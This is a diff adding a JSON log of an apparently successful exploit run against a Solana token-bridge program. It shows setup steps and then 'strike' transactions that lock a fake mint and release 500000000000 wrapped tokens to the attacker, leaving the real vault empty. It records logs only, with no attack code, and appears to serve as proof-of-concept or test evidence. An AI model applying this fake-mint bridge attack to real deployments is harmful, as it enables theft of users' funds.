@@ -1,0 +1,66 @@
+{
+  "programId": "Cr6YDW1CGy1TTHYPtgeAhf3v3hAzn1qKGsCpjD1XaKyi",
+  "outcome": "exploit succeeded",
+  "balances": {
+    "attackerWrappedTokensReceived": "500000000000",
+    "fakeVaultHolds": "500000000000",
+    "realVaultHolds": "0"
+  },
+  "steps": [
+    {
+      "name": "setup: create oracle price account",
+      "signature": "5aqnthm9xeBXaRHBhAxKstWLTGBigaRLoSxZzpYb7QpJoaKn5sCW14TgFGfHjLyyXi1GGYaFHRscC7jHdQNYHYV7",
+      "logs": [
+        "Program 11111111111111111111111111111111 invoke [1]",
+        "Program 11111111111111111111111111111111 success",
+        "Program 2RDdcMcpTV6h1C8rGABbsGuBScUU3XJoHxagoTgnrx7N invoke [1]",
+        "Program 2RDdcMcpTV6h1C8rGABbsGuBScUU3XJoHxagoTgnrx7N consumed 714 of 202850 compute units",
+        "Program 2RDdcMcpTV6h1C8rGABbsGuBScUU3XJoHxagoTgnrx7N success"
+      ]
+    },
+    {
+      "name": "setup: initialize bridge",
+      "signature": "342FdN5W6sBD94Zz32UnL1RmRo3DTxQ5krK5Naciq6rfSgouR4UrJrxadY7cEycYQmBNww9Ke3rhHn7YzcZk88PG",
+      "logs": [
+        "Program Cr6YDW1CGy1TTHYPtgeAhf3v3hAzn1qKGsCpjD1XaKyi invoke [1]",
+        "Program 11111111111111111111111111111111 invoke [2]",
+        "Program 11111111111111111111111111111111 success",
+        "Program 11111111111111111111111111111111 invoke [2]",
+        "Program 11111111111111111111111111111111 success",
+        "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [2]",
+        "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA consumed 202 of 175163 compute units",
+        "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA success",
+        "Program Cr6YDW1CGy1TTHYPtgeAhf3v3hAzn1qKGsCpjD1XaKyi consumed 25975 of 200000 compute units",
+        "Program Cr6YDW1CGy1TTHYPtgeAhf3v3hAzn1qKGsCpjD1XaKyi success"
+      ]
+    },
+    {
+      "name": "strike: lock (fake mint)",
+      "signature": "2s21jn1anh8jZDs1C2YyYkgBrgUHCi5VP5gU1iCyMCyjmVZYCFVhffhgfZLTNCe4NQHx69xkMSFxCM335CEp3sDe",
+      "logs": [
+        "Program Cr6YDW1CGy1TTHYPtgeAhf3v3hAzn1qKGsCpjD1XaKyi invoke [1]",
+        "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [2]",
+        "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA consumed 76 of 185174 compute units",
+        "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA success",
+        "Program 11111111111111111111111111111111 invoke [2]",
+        "Program 11111111111111111111111111111111 success",
+        "Program log: locked 500000000000 into vault, nonce 0",
+        "Program Cr6YDW1CGy1TTHYPtgeAhf3v3hAzn1qKGsCpjD1XaKyi consumed 19026 of 200000 compute units",
+        "Program Cr6YDW1CGy1TTHYPtgeAhf3v3hAzn1qKGsCpjD1XaKyi success"
+      ]
+    },
+    {
+      "name": "strike: release",
+      "signature": "5Vwwc8E1u8ckFZSrxmx8ESUycRqskR4YFN6zBKKJ3SSSkATfZ2pVR2UCfFRffpW1tFFaHhU9LuDmLB9Vs8aJnPR6",
+      "logs": [
+        "Program Cr6YDW1CGy1TTHYPtgeAhf3v3hAzn1qKGsCpjD1XaKyi invoke [1]",
+        "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [2]",
+        "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA consumed 122 of 194834 compute units",
+        "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA success",
+        "Program log: released 500000000000 wrapped tokens for nonce 0",
+        "Program Cr6YDW1CGy1TTHYPtgeAhf3v3hAzn1qKGsCpjD1XaKyi consumed 9628 of 203000 compute units",
+        "Program Cr6YDW1CGy1TTHYPtgeAhf3v3hAzn1qKGsCpjD1XaKyi success"
+      ]
+    }
+  ]
+}
